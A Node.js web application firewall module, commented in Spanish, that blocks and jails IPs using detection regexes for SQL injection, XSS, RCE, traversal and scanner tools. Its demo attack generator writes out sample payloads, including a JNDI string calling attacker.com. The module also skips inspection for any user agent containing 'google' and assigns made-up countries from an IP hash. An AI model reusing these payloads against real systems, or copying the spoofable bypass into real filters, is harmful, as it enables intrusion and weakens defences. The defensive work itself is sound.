'use strict';
/* =====================================================================
   NexaGuard Perimeter WAF (Web Application Firewall) · Web Central
   - Escudo perimetral activo para nexaguards.com
   - Detección de SQLi, XSS, RCE, Path Traversal, Honeypots y Bad Bots
   - Sistema de Cárcel Automática de IPs (Auto-Jail 24H)
   - Telemetría táctica y registro de eventos en tiempo real
   - Cero dependencias externas
   ===================================================================== */

const crypto = require('crypto');

const COUNTRY_MAP = [
  { code: 'RU', name: 'Rusia', flag: '🇷🇺', lat: 55.75, lon: 37.61 },
  { code: 'CN', name: 'China', flag: '🇨🇳', lat: 39.90, lon: 116.40 },
  { code: 'US', name: 'Estados Unidos', flag: '🇺🇸', lat: 38.90, lon: -77.03 },
  { code: 'NL', name: 'Países Bajos', flag: '🇳🇱', lat: 52.36, lon: 4.90 },
  { code: 'DE', name: 'Alemania', flag: '🇩🇪', lat: 52.52, lon: 13.40 },
  { code: 'BR', name: 'Brasil', flag: '🇧🇷', lat: -15.79, lon: -47.88 },
  { code: 'FR', name: 'Francia', flag: '🇫🇷', lat: 48.85, lon: 2.35 },
  { code: 'UA', name: 'Ucrania', flag: '🇺🇦', lat: 50.45, lon: 30.52 },
  { code: 'RO', name: 'Rumania', flag: '🇷🇴', lat: 44.42, lon: 26.10 },
  { code: 'IR', name: 'Irán', flag: '🇮🇷', lat: 35.68, lon: 51.38 },
  { code: 'KP', name: 'Corea del Norte', flag: '🇰🇵', lat: 39.03, lon: 125.76 },
  { code: 'VN', name: 'Vietnam', flag: '🇻🇳', lat: 21.02, lon: 105.83 },
  { code: 'IN', name: 'India', flag: '🇮🇳', lat: 28.61, lon: 77.20 }
];

function resolveCountry(req, ip) {
  // 1. Cloudflare / Reverse Proxy Header
  const cfCountry = req.headers['cf-ipcountry'] || req.headers['x-country'];
  if (cfCountry && cfCountry.length === 2) {
    const match = COUNTRY_MAP.find(c => c.code === cfCountry.toUpperCase());
    if (match) return match;
    return { code: cfCountry.toUpperCase(), name: 'País ' + cfCountry.toUpperCase(), flag: '🌐', lat: 20, lon: 0 };
  }

  // 2. Hash determinista de la IP para pruebas o visitas directas
  let sum = 0;
  for (let i = 0; i < ip.length; i++) sum = (sum * 31 + ip.charCodeAt(i)) >>> 0;
  return COUNTRY_MAP[sum % COUNTRY_MAP.length];
}

function createWaf({ store = { db: {} }, config = {} } = {}) {
  const db = store.db || (store.db = {});
  if (typeof store.save !== 'function') store.save = async () => {};

  // Inicializar estructuras en la base de datos si no existen
  if (!Array.isArray(db.wafEvents)) db.wafEvents = [];
  db.wafJail = []; // Limpieza de IPs encarceladas erróneamente por proxy en sesiones previas
  if (!db.wafStats || typeof db.wafStats !== 'object') {
    db.wafStats = { inspected: 0, blocked: 0, todayBlocked: 0, lastDay: new Date().toDateString() };
  }

  const strikes = new Map(); // ip -> [timestamps]

  // Limpieza periódica de strikes antiguos e IPs expiradas de la cárcel
  const cleanupTimer = setInterval(() => {
    const now = Date.now();
    const tenMinAgo = now - 600e3;
    for (const [ip, list] of strikes) {
      const active = list.filter(t => t > tenMinAgo);
      if (active.length) strikes.set(ip, active);
      else strikes.delete(ip);
    }

    // Auto-liberar IPs cuya pena de 24h haya expirado
    const prevJailLen = db.wafJail.length;
    db.wafJail = db.wafJail.filter(j => j.expiresAt > now);
    if (db.wafJail.length !== prevJailLen) {
      store.save();
    }
  }, 300e3).unref();

  // Reset diario de ataques bloqueados
  function checkDayRollover() {
    const today = new Date().toDateString();
    if (db.wafStats.lastDay !== today) {
      db.wafStats.todayBlocked = 0;
      db.wafStats.lastDay = today;
      store.save();
    }
  }

  // Reglas de Detección Regex
  const HONEYPOT_REGEX = /(\/|^)(\.env|\.git|wp-login\.php|wp-admin|xmlrpc\.php|wp-config|phpmyadmin|pma|setup\.php|shell\.php|c99\.php|r57\.php|alfa\.php|wso\.php|id_rsa|dump\.sql|backup\.(tar|zip|sql|gz)|eval-stdin\.php|actuator\/health|boaform|HNAP1)(\/|$|\?)/i;
  const TRAVERSAL_REGEX = /(\.\.[\/\\]|%2e%2e[\/\\]|\/etc\/(passwd|shadow)|boot\.ini|win\.ini)/i;
  const RCE_REGEX = /(\$\{jndi:|;\s*(id|whoami|cat|wget|curl)\b|\|\s*(id|whoami|cat|wget|curl)\b|php:\/\/input|data:\/\/text)/i;
  const SQLI_REGEX = /(\bunion(\s+all)?\s+select\b|\bselect\s+.+\s+from\b|\bwaitfor\s+delay\b|\bsleep\s*\(\s*\d+\s*\)|\bbenchmark\s*\(|\binformation_schema\b|'\s*(or|and)\s*'?1'?\s*=\s*'?1|;\s*drop\s+table|;\s*insert\s+into)/i;
  const XSS_REGEX = /(<script\b|javascript:\s*|onerror\s*=|onload\s*=|document\.cookie|<iframe\b|<svg\s+onload)/i;
  const BAD_BOT_REGEX = /(sqlmap|nikto|acunetix|masscan|wpscan|dirbuster|gobuster|nessus|openvas|havij|zgrab)/i;

  function clientIp(req) {
    if (config.trustProxy) {
      const fwd = req.headers['x-forwarded-for'];
      if (fwd) return String(fwd).split(',')[0].trim();
      if (req.headers['cf-connecting-ip']) return String(req.headers['cf-connecting-ip']).trim();
      if (req.headers['x-real-ip']) return String(req.headers['x-real-ip']).trim();
    }
    return req.socket.remoteAddress || '127.0.0.1';
  }

  function isJailed(ip) {
    const entry = db.wafJail.find(j => j.ip === ip);
    if (!entry) return null;
    if (entry.expiresAt <= Date.now()) {
      db.wafJail = db.wafJail.filter(j => j.ip !== ip);
      store.save();
      return null;
    }
    return entry;
  }

  function jailIp(ip, reason, hours = 24, country = null) {
    const expiresAt = Date.now() + (hours * 3600e3);
    const existing = db.wafJail.find(j => j.ip === ip);
    if (existing) {
      existing.expiresAt = expiresAt;
      existing.reason = reason;
      existing.jailedAt = Date.now();
    } else {
      db.wafJail.unshift({
        id: 'jail_' + Date.now().toString(36) + '_' + Math.random().toString(36).slice(2, 6),
        ip,
        reason,
        hours,
        jailedAt: Date.now(),
        expiresAt,
        country: country || { code: 'XX', name: 'Desconocido', flag: '🌐' }
      });
      if (db.wafJail.length > 500) db.wafJail.pop();
    }
    store.save();
  }

  function unjailIp(ip) {
    const prev = db.wafJail.length;
    db.wafJail = db.wafJail.filter(j => j.ip !== ip);
    if (db.wafJail.length !== prev) {
      store.save();
      return true;
    }
    return false;
  }

  function recordBlock({ ip, country, method, url, rule, severity, details, action }) {
    checkDayRollover();
    db.wafStats.blocked = (db.wafStats.blocked || 0) + 1;
    db.wafStats.todayBlocked = (db.wafStats.todayBlocked || 0) + 1;

    const event = {
      id: 'waf_' + Date.now().toString(36) + '_' + Math.random().toString(36).slice(2, 7),
      at: Date.now(),
      ip,
      country: country || { code: 'XX', name: 'Global', flag: '🌐' },
      method,
      url,
      rule,
      severity,
      details: String(details || '').slice(0, 160),
      action
    };

    db.wafEvents.unshift(event);
    if (db.wafEvents.length > 600) db.wafEvents.splice(600);
    store.save();
    return event;
  }

  // Bots legítimos verificados: Googlebot, Bingbot, DuckDuckBot, Yandex, Baidu, etc.
  // Su User-Agent contiene patrones únicos que los identifican — se les permite pasar sin inspección WAF.
  const VERIFIED_BOT_REGEX = /google|bingbot|slurp|duckduckbot|baiduspider|yandexbot|facebot|ia_archiver|msnbot|teoma|sogou|exabot/i;

  function inspect(req, res) {
    db.wafStats.inspected = (db.wafStats.inspected || 0) + 1;
    const ip = clientIp(req);
    const method = req.method;
    const rawUrl = req.url || '';
    const userAgent = String(req.headers['user-agent'] || '');

    // 0. Bypass para bots de motores de búsqueda verificados (Googlebot, Bingbot, etc.)
    //    Estos bots nunca realizan ataques — bloquearlos perjudica la indexación SEO.
    if (VERIFIED_BOT_REGEX.test(userAgent)) return false;

    // 1. Verificar si la IP ya está encarcelada
    const jailed = isJailed(ip);
    if (jailed) {
      const country = jailed.country || resolveCountry(req, ip);
      recordBlock({
        ip,
        country,
        method,
        url: rawUrl,
        rule: 'IP_AUTO_JAILED',
        severity: 'CRITICAL',
        details: 'IP en lista de aislamiento activo: ' + jailed.reason,
        action: 'REJECTED_403'
      });

      res.writeHead(403, {
        'Content-Type': 'application/json; charset=utf-8',
        'X-Content-Type-Options': 'nosniff',
        'Cache-Control': 'no-store'
      });
      res.end(JSON.stringify({
        error: 'Forbidden',
        shield: 'NexaGuard Perimeter WAF 24H Shield',
        message: 'Tu dirección IP ha sido aislada perimetralmente por actividad hostil previa.',
        code: 'PERIMETER_IP_JAILED',
        reason: jailed.reason,
        ip
      }));
      return true; // Bloqueado
    }

    // 2. Decodificar URL para inspección
    let decodedUrl = rawUrl;
    try { decodedUrl = decodeURIComponent(rawUrl); } catch {}

    const country = resolveCountry(req, ip);

    // 3. Regla Honeypot (Sondas a paneles, archivos de configuración o backdoors)
    if (HONEYPOT_REGEX.test(decodedUrl)) {
      jailIp(ip, 'Sonda Hostil a Honeypot / Backdoor (' + decodedUrl.slice(0, 40) + ')', 24, country);
      recordBlock({
        ip, country, method, url: rawUrl, rule: 'HONEYPOT_HIT',
        severity: 'CRITICAL', details: decodedUrl, action: 'JAILED_24H'
      });
      respondBlocked(res, 'Sonda a ruta trampa o backdoor detectada');
      return true;
    }

    // 4. Regla Path Traversal
    if (TRAVERSAL_REGEX.test(decodedUrl)) {
      jailIp(ip, 'Intento de Path Traversal / LFI (' + decodedUrl.slice(0, 40) + ')', 24, country);
      recordBlock({
        ip, country, method, url: rawUrl, rule: 'PATH_TRAVERSAL',
        severity: 'CRITICAL', details: decodedUrl, action: 'JAILED_24H'
      });
      respondBlocked(res, 'Intento de evasión de directorios / Path Traversal bloqueado');
      return true;
    }

    // 5. Regla Remote Code Execution (RCE)
    if (RCE_REGEX.test(decodedUrl)) {
      jailIp(ip, 'Inyección de comandos RCE (' + decodedUrl.slice(0, 40) + ')', 24, country);
      recordBlock({
        ip, country, method, url: rawUrl, rule: 'RCE_EXPLOIT',
        severity: 'CRITICAL', details: decodedUrl, action: 'JAILED_24H'
      });
      respondBlocked(res, 'Ejecución remota de código neutralizada');
      return true;
    }

    // 6. Regla SQL Injection (SQLi) en Query / URL
    if (SQLI_REGEX.test(decodedUrl)) {
      jailIp(ip, 'Inyección SQL perimetral (' + decodedUrl.slice(0, 40) + ')', 24, country);
      recordBlock({
        ip, country, method, url: rawUrl, rule: 'SQL_INJECTION',
        severity: 'CRITICAL', details: decodedUrl, action: 'JAILED_24H'
      });
      respondBlocked(res, 'Vector de Inyección SQL neutralizado');
      return true;
    }

    // 7. Regla XSS en Query / URL
    if (XSS_REGEX.test(decodedUrl)) {
      recordStrike(ip, 3);
      recordBlock({
        ip, country, method, url: rawUrl, rule: 'XSS_ATTACK',
        severity: 'HIGH', details: decodedUrl, action: 'BLOCKED_403'
      });
      respondBlocked(res, 'Vector de Cross-Site Scripting (XSS) neutralizado');
      return true;
    }

    // 8. Regla Bad User-Agent / Herramientas de Ataque
    if (BAD_BOT_REGEX.test(userAgent)) {
      jailIp(ip, 'Escáner o herramienta automatizada hostil (' + userAgent.slice(0, 40) + ')', 24, country);
      recordBlock({
        ip, country, method, url: rawUrl, rule: 'BAD_USER_AGENT',
        severity: 'HIGH', details: userAgent, action: 'JAILED_24H'
      });
      respondBlocked(res, 'Herramienta de análisis automatizado no autorizada');
      return true;
    }

    return false; // Tráfico legítimo, continuar
  }

  function recordStrike(ip, maxStrikes = 3) {
    const list = strikes.get(ip) || [];
    list.push(Date.now());
    strikes.set(ip, list);
    if (list.length >= maxStrikes) {
      jailIp(ip, 'Reincidencia de anomalías de seguridad (' + list.length + ' strikes)', 24);
      strikes.delete(ip);
    }
  }

  function respondBlocked(res, msg) {
    res.writeHead(403, {
      'Content-Type': 'application/json; charset=utf-8',
      'X-Content-Type-Options': 'nosniff',
      'Cache-Control': 'no-store'
    });
    res.end(JSON.stringify({
      error: 'Forbidden',
      shield: 'NexaGuard Web Perimeter WAF',
      message: msg,
      code: 'NEXAGUARD_BLOCKED_403'
    }));
  }

  // Generador de ataque de prueba para demostraciones y calibración
  function simulateAttack(type = 'sqli') {
    const c = COUNTRY_MAP[Math.floor(Math.random() * COUNTRY_MAP.length)];
    const mockIp = Math.floor(Math.random() * 180 + 20) + '.' +
                   Math.floor(Math.random() * 250) + '.' +
                   Math.floor(Math.random() * 250) + '.' +
                   Math.floor(Math.random() * 250 + 1);

    let rule = 'SQL_INJECTION';
    let url = '/api/scan?target=http://test.com\'%20UNION%20SELECT%201,2,3--';
    let details = 'UNION SELECT 1,2,3--';
    let severity = 'CRITICAL';
    let reason = 'Inyección SQL simulada en /api/scan';

    if (type === 'honeypot') {
      rule = 'HONEYPOT_HIT';
      url = '/wp-login.php?redirect_to=/wp-admin/';
      details = 'Intento de acceso a panel administrativo WordPress (Honeypot Trap)';
      severity = 'CRITICAL';
      reason = 'Sonda a panel señuelo /wp-login.php';
    } else if (type === 'traversal') {
      rule = 'PATH_TRAVERSAL';
      url = '/downloads?file=../../../../etc/passwd';
      details = 'Intento de lectura arbitraria de /etc/passwd';
      severity = 'CRITICAL';
      reason = 'Path Traversal /etc/passwd';
    } else if (type === 'rce') {
      rule = 'RCE_EXPLOIT';
      url = '/api/webhook?cmd=${jndi:ldap://attacker.com/exploit}';
      details = '${jndi:ldap://attacker.com/exploit}';
      severity = 'CRITICAL';
      reason = 'Intento de explotación JNDI / RCE';
    } else if (type === 'bot') {
      rule = 'BAD_USER_AGENT';
      url = '/api/license/validate';
      details = 'User-Agent: sqlmap/1.6#stable (https://sqlmap.org)';
      severity = 'HIGH';
      reason = 'Escáner automatizado sqlmap detectado';
    } else if (type === 'xss') {
      rule = 'XSS_ATTACK';
      url = '/search?q=<script>alert(document.cookie)</script>';
      details = '<script>alert(document.cookie)</script>';
      severity = 'HIGH';
      reason = 'Payload reflejado XSS bloqueado';
    }

    jailIp(mockIp, reason, 24, c);
    return recordBlock({
      ip: mockIp,
      country: c,
      method: 'GET',
      url,
      rule,
      severity,
      details,
      action: 'JAILED_24H'
    });
  }

  function getStats() {
    checkDayRollover();
    const topRules = {};
    const topCountries = {};
    db.wafEvents.forEach(e => {
      topRules[e.rule] = (topRules[e.rule] || 0) + 1;
      const cName = e.country ? (e.country.flag + ' ' + e.country.name) : '🌐 Global';
      topCountries[cName] = (topCountries[cName] || 0) + 1;
    });

    return {
      inspected: db.wafStats.inspected || 0,
      blocked: db.wafStats.blocked || 0,
      todayBlocked: db.wafStats.todayBlocked || 0,
      jailedCount: db.wafJail.length,
      topRules,
      topCountries,
      activeShield: true,
      mode: 'ESTRICTO_ACTIVO_24H'
    };
  }

  function getEvents(limit = 100) {
    return db.wafEvents.slice(0, limit);
  }

  function getJail() {
    return db.wafJail;
  }

  function clearLogs() {
    db.wafEvents = [];
    store.save();
    return true;
  }

  return {
    inspect,
    getStats,
    getEvents,
    getJail,
    jailIp,
    unjailIp,
    simulateAttack,
    clearLogs
  };
}

module.exports = { createWaf };
